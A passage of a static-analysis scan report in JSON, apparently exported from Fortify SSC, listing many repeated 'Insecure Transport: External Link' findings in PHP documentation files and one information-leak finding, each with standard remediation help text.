http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4772/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE1601"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4773",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file MonitorTest.php on line 1254 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4773/?engineType=SCA&issue=FEF7E47D79559BC47E66776442EE1602"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4392",
          "shortDescription" : {
            "text" : "System Information Leak: External"
          },
          "fullDescription" : {
            "text" : "The program might reveal system data or debugging information in allTests.php with a call to error_reporting() on line 21. The information revealed by error_reporting() could help an adversary form a plan of attack.\n\n\n"
          },
          "help" : {
            "text" : "An external information leak occurs when system data or debugging information leaves the program to a remote machine via a socket or network connection.\n\n\n\nExample 1: The following code writes an exception to the HTTP response:\n\n\n&lt;?php\n    ...\n    echo \"Server error! Printing the backtrace\";\n    debug_print_backtrace();\n    ...\n?&gt;\n\n\nDepending upon the system configuration, this information can be dumped to a console, written to a log file, or exposed to a remote user. For example, with scripting mechanisms it is trivial to redirect output information from \"Standard error\" or \"Standard output\" into a file or another program. Alternatively, the system that the program runs on could have a remote logging mechanism such as a \"syslog\" server that sends the logs to a remote device. During development, you have no way of knowing where this information might end up being displayed.\n\nIn some cases, the error message provides the attacker with the precise type of attack to which the system is vulnerable. For example, a database error message can reveal that the application is vulnerable to a SQL injection attack. Other error messages can reveal more oblique clues about the system. In Example 1, the leaked information could imply information about the type of operating system, the applications installed on the system, and the amount of care that the administrators have put into configuring the program.\n\nWrite error messages with security in mind. In production environments, turn off detailed error information in favor of brief messages. Restrict the generation and storage of detailed output that can help administrators and programmers diagnose problems. Debug traces can sometimes appear in non-obvious places (embedded in comments in the HTML for an error page, for example).\n\nEven brief error messages that do not reveal stack traces or database dumps can potentially aid an attacker. For example, an \"Access Denied\" message can reveal that a file or user exists on the system.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4392/?engineType=SCA&issue=1566FE131368FA69594FEC985E0F31F6"
          },
          "properties" : {
            "tags" : [ "Low" ],
            "precision" : "low"
          }
        }, {
          "id" : "4717",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching.html on line 224 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4717/?engineType=SCA&issue=E946CCC02E9345FE462B1E66D21FF683"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4718",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching.html on line 224 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4718/?engineType=SCA&issue=E946CCC02E9345FE462B1E66D21FF684"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4701",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching_Factory.php.html on line 256 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4701/?engineType=SCA&issue=E0CC8AABBA787CAB1CB5ABB8AC5E4B0D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4702",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching_Factory.php.html on line 256 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4702/?engineType=SCA&issue=E0CC8AABBA787CAB1CB5ABB8AC5E4B0E"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4527",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching_File.php.html on line 451 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4527/?engineType=SCA&issue=68330A4408C794078BA7230A5CA89AC1"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4528",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching_File.php.html on line 451 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4528/?engineType=SCA&issue=68330A4408C794078BA7230A5CA89AC2"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4743",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching_Interface.php.html on line 182 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4743/?engineType=SCA&issue=F2ED2033A99EE6EF39E0BFD63C99672C"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4744",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching_Interface.php.html on line 182 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4744/?engineType=SCA&issue=F2ED2033A99EE6EF39E0BFD63C99672D"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4693",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching_Session.php.html on line 375 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4693/?engineType=SCA&issue=DC32A6EE462A7FB78159A2055976154A"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4694",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Caching_Session.php.html on line 375 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4694/?engineType=SCA&issue=DC32A6EE462A7FB78159A2055976154B"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4494",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Converter.php.html on line 1225 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4494/?engineType=SCA&issue=5AE732F96F4358989B4B073A4F73CD57"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4495",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Converter.php.html on line 1225 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4495/?engineType=SCA&issue=5AE732F96F4358989B4B073A4F73CD58"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4438",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Event.php.html on line 552 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4438/?engineType=SCA&issue=30B96C660F154D1F40C0CC855FB2A536"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4439",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Event.php.html on line 552 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4439/?engineType=SCA&issue=30B96C660F154D1F40C0CC855FB2A537"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4558",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Filter.html on line 97 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4558/?engineType=SCA&issue=79E7F0D6FE8B64B1E7F8D8BFCED45684"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4559",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Filter.html on line 97 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4559/?engineType=SCA&issue=79E7F0D6FE8B64B1E7F8D8BFCED45685"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4631",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Filter.php.html on line 481 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4631/?engineType=SCA&issue=AD16B9CEF94BB79A9ADD1141A36E64C0"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4632",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Filter.php.html on line 481 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4632/?engineType=SCA&issue=AD16B9CEF94BB79A9ADD1141A36E64C1"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4490",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Filter_Storage.php.html on line 678 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4490/?engineType=SCA&issue=57EE9FB4D6A189039F9E0AFA0F9FBD57"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4491",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Filter_Storage.php.html on line 678 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
            "text" : "Ensure that hyperlinks on your web pages only link to secure locations to prevent any user-compromise when navigating around your website. Even if the link redirects from an insecure protocol (such as HTTP) to a secure protocol (such as HTTPS), the initial connection over an unencrypted channel enables an attacker to perform a man-in-the-middle (MiTM) attack. This enables the attacker to control the page the resulting landing page.\n\nExample: Consider the following hyperlink:\n\n&lt;a href=\"http://www.example.com/index.html\"/&gt;\n\n\nIf an attacker is listening to the network traffic between the user and the server, the attacker can imitate or manipulate www.example.com to load their own web page.\n\nLinks to third-party websites might not initially be considered important to secure, but any compromise can appear to a user as coming from a link on your web page and can therefore lower user trust in using your platform.\n\nKeep control over the web pages linked on your website, and if possible ensure that the links are always loaded over a secure protocol. If an insecure protocol is required by the destination server, provide a warning to inform the user that there is some additional risk from clicking the link. Do not include scripts or other artifacts from third-party sites where possible.\n\n\n\n\nFor more information, see http://192.168.65.213:8080/ssc/html/ssc/version/11/fix/4491/?engineType=SCA&issue=57EE9FB4D6A189039F9E0AFA0F9FBD58"
          },
          "properties" : {
            "tags" : [ "Medium" ],
            "precision" : "high"
          }
        }, {
          "id" : "4514",
          "shortDescription" : {
            "text" : "Insecure Transport: External Link"
          },
          "fullDescription" : {
            "text" : "The file Init.php.html on line 571 links to a third-party site over an unencrypted channel.\n\n\n"
          },
          "help" : {
